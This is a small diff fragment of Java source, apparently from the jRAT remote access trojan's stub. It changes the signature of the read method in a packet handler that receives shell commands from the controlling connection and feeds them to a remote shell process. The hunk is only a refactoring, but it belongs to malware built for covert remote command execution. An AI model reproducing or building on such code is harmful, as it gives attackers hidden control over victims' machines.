@@ -10,7 +10,7 @@ import se.jrat.stub.RemoteShell;
 public class Packet25RemoteShellExecute extends AbstractIncomingPacket {
 
 	@Override
-	public void read() throws Exception {
+	public void read(Connection con) throws Exception {
 		String line = Connection.instance.readLine();
 
 		if (LaunchProcess.latest != null) {
